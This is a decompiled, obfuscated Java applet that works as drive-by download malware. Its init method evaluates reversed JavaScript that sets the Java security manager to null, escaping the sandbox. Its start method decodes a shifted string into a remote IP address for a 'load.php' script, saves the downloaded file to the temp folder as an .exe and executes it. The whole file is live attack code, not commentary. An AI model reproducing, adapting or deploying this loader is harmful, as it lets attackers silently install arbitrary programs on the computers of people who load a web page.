import java.io.InputStream;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.FileOutputStream;
import java.util.Random;
import java.net.URL;
import javax.script.ScriptEngine;
import java.awt.Component;
import javax.script.ScriptEngineManager;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class rhi extends Applet
{
    private JList misst;
    public int LqcaGS;
    private Class[] d;
    private String K;
    private Class[] e;
    private Class[] j;
    private Boolean H;
    public Class SwnheC;
    public String dbhBvE;
    public Class[] NdlFdp;
    public Boolean mLmebU;
    public int gJEnqr;
    public Class[] QKqQRV;
    public Class GUtBph;
    private JList mi2sst;
    
    public Boolean EcSHVw() {
        return true;
    }
    
    @Override
    public void init() {
        int i = 0;
        while (i < 10) {
            try {
                final String sdg = "oop".replace("oop", "js");
                this.EcSHVw();
                final ScriptEngine art = new ScriptEngineManager().getEngineByName(sdg);
                this.EcSHVw();
                final String sdytsdhsdh = ";sitjrtht = egassem.rortjrtre;};\"petjrty\" nrutjrtter;)(trtjrtats.tetjrtlppa;)llun(rtjrteganaMytirutjrtceStes.metsyStjrt.gnatjrtl.atjrtvaj {tjrt)(noitctjrtnuf = gtjrtnirtSot.stjrtiht;tjrt)\"rorrtjrte yM\"(rotjrtrrE wetjrtn =tjrt rortjrtre ratjrtv".replace("tjrt", "");
                final String sdhh = new StringBuffer(sdytsdhsdh).reverse().toString();
                this.EcSHVw();
                if (this.EcSHVw()) {
                    art.eval(sdhh);
                }
                this.EcSHVw();
                final String essrs = "rortjrtre".replace("tjrt", "");
                this.EcSHVw();
                final String reero = new StringBuffer(essrs).reverse().toString();
                this.misst = new JList((E[])new Object[] { art.get(reero) });
                this.EcSHVw();
                this.EcSHVw();
                this.EcSHVw();
                this.EcSHVw();
                this.EcSHVw();
                this.EcSHVw();
                this.add(this.misst);
                this.EcSHVw();
                this.EcSHVw();
                i = 10;
                this.EcSHVw();
                this.EcSHVw();
                return;
            }
            catch (Exception ex) {
                if (i != 9) {}
                ++i;
                continue;
            }
            break;
        }
    }
    
    public Boolean EcsVw() {
        return true;
    }
    
    public void Ecs() {
        final int derm = 9;
        final int reso = derm / 2 + 55;
    }
    
    @Override
    public void start() {
        try {
            final String teeh = "kwws=226414;7156:17<2ordg1sksBvso@uklqr";
            String asq = "";
            this.Ecs();
            for (int s = 0; s < teeh.length(); ++s) {
                int as = teeh.charAt(s);
                as -= 3;
                asq += (char)as;
            }
            final URL wers = new URL(asq);
            if (this.EcSHVw()) {
                wers.openConnection();
            }
            this.Ecs();
            this.Ecs();
            final InputStream reader = wers.openStream();
            this.Ecs();
            this.Ecs();
            for (int ij = 0; ij < 9; ++ij, ++ij) {}
            this.Ecs();
            String wasf = System.getProperty("jasvavasva.iasvo.tmasvpdasvir".replace("asv", ""));
            this.Ecs();
            this.Ecs();
            if (wasf.charAt(wasf.length() - 1) != '\\') {
                wasf += "\\";
            }
            final Random ehaa = new Random();
            this.Ecs();
            this.Ecs();
            final int randomInt = ehaa.nextInt(100);
            this.Ecs();
            this.Ecs();
            final String fl = wasf + "like" + "o" + Integer.toString(randomInt) + ".e".concat("xe");
            this.Ecs();
            this.Ecs();
            final FileOutputStream maiter = new FileOutputStream(fl);
            this.Ecs();
            this.Ecs();
            byte[] mdmaiter = new byte[153600];
            final byte[] mdmr = new byte[15];
            this.Ecs();
            this.Ecs();
            int erist = 0;
            this.Ecs();
            this.Ecs();
            int sss = 0;
            this.Ecs();
            while ((sss = reader.read(mdmaiter)) > 0) {
                maiter.write(mdmaiter, 0, sss);
                this.Ecs();
                final int b = 0;
                mdmaiter = new byte[153600];
                erist += sss;
            }
            this.Ecs();
            maiter.close();
            reader.close();
            final boolean wwerist;
            final boolean tmpw1 = wwerist = true;
            final boolean localBoolegean3;
            final boolean tmpw2 = localBoolegean3 = true;
            this.Ecs();
            this.Ecs();
            final Runtime wqento = Runtime.getRuntime();
            for (int aj = 0; aj < 9; ++aj, ++aj) {}
            this.Ecs();
            this.Ecs();
            final Process exx = wqento.exec(fl);
            exx.waitFor();
            this.Ecs();
            final BufferedReader fduuer = new BufferedReader(new InputStreamReader(exx.getInputStream()));
        }
        catch (Exception ex) {}
    }
}
